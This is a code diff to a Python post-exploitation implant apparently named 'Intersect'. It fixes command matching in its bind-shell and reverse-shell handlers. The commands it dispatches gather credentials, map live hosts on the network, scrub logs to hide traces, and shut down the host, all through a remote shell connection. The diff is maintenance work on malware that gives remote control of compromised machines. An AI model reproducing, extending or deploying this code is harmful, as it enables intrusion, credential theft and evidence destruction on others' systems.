@@ -715,36 +715,36 @@ def bindShell():
         elif cmd.startswith("rebootsys"):
             conn.send("[!] Server system is going down for a reboot!")
             os.system("shutdown -h now")
-        elif cmd == ("extask osinfo\n"):
+        elif cmd == ("extask osinfo"):
             Gather_OS()
             conn.send("\n[+] OS Info Gathering complete.")
             conn.send("\n[+] Reports located in: %s " % Temp_Dir)
             conn.send("\nIntersect "+str(os.getcwd())+" >> ")
-        elif cmd == ("extask network\n"):
+        elif cmd == ("extask network"):
             NetworkInfo()
             conn.send("\n[+] Network Gather complete.")
             conn.send("\n[+] Reports located in: %s " % Temp_Dir)
             conn.send("\nIntersect "+str(os.getcwd())+" >> ")
-        elif cmd == ("extask credentials\n"):
+        elif cmd == ("extask credentials"):
             GetCredentials()
             conn.send("\n[+] Credentials Gather complete.")
             conn.send("\n[+] Reports located in: %s " % Temp_Dir)
             conn.send("\nIntersect "+str(os.getcwd())+" >> ")
-        elif cmd == ("extask livehosts\n"):
+        elif cmd == ("extask livehosts"):
             NetworkMap()
             conn.send("\n[+] Network Map complete.")
             conn.send("\n[+] Reports located in: %s " % Temp_Dir)
             conn.send("\nIntersect "+str(os.getcwd())+" >> ")
-        elif cmd == ("extask findextras\n"):
+        elif cmd == ("extask findextras"):
             FindExtras()
             conn.send("\n[+] Extras Gather complete.")
             conn.send("\n[+] Reports located in: %s " % Temp_Dir)
             conn.send("\nIntersect "+str(os.getcwd())+" >> ")
-        elif cmd == ("extask scrub\n"):
+        elif cmd == ("extask scrub"):
             ScrubLog()
             conn.send("\n[+] Scrubbing complete.")
             conn.send("\nIntersect "+str(os.getcwd())+" >> ")
-        elif cmd == ('killme\n'):
+        elif cmd == ('killme'):
             conn.send("[!] Shutting down shell!\n")
             conn.close()
             sys.exit(0)
@@ -813,36 +813,36 @@ def reverseShell():
         elif cmd.startswith("rebootsys"):
             conn.send("[!] Server system is going down for a reboot!")
             os.system("shutdown -h now")
-        elif cmd == ("extask osinfo\n"):
+        elif cmd == ("extask osinfo"):
             Gather_OS()
             conn.send("\n[+] OS Info Gathering complete.")
             conn.send("\n[+] Reports located in: %s " % Temp_Dir)
             conn.send("\nIntersect "+str(os.getcwd())+" >> ")
-        elif cmd == ("extask network\n"):
+        elif cmd == ("extask network"):
             NetworkInfo()
             conn.send("\n[+] Network Gather complete.")
             conn.send("\n[+] Reports located in: %s " % Temp_Dir)
             conn.send("\nIntersect "+str(os.getcwd())+" >> ")
-        elif cmd == ("extask credentials\n"):
+        elif cmd == ("extask credentials"):
             GetCredentials()
             conn.send("\n[+] Credentials Gather complete.")
             conn.send("\n[+] Reports located in: %s " % Temp_Dir)
             conn.send("\nIntersect "+str(os.getcwd())+" >> ")
-        elif cmd == ("extask livehosts\n"):
+        elif cmd == ("extask livehosts"):
             NetworkMap()
             conn.send("\n[+] Network Map complete.")
             conn.send("\n[+] Reports located in: %s " % Temp_Dir)
             conn.send("\nIntersect "+str(os.getcwd())+" >> ")
-        elif cmd == ("extask findextras\n"):
+        elif cmd == ("extask findextras"):
             FindExtras()
             conn.send("\n[+] Extras Gather complete.")
             conn.send("\n[+] Reports located in: %s " % Temp_Dir)
             conn.send("\nIntersect "+str(os.getcwd())+" >> ")
-        elif cmd == ("extask scrub\n"):
+        elif cmd == ("extask scrub"):
             ScrubLog()
             conn.send("\n[+] Scrubbing complete.")
             conn.send("\nIntersect "+str(os.getcwd())+" >> ")
-        elif cmd == ('killme\n'):
+        elif cmd == ('killme'):
             conn.send("[!] Shutting down shell!\n")
             conn.close()
             sys.exit(0)
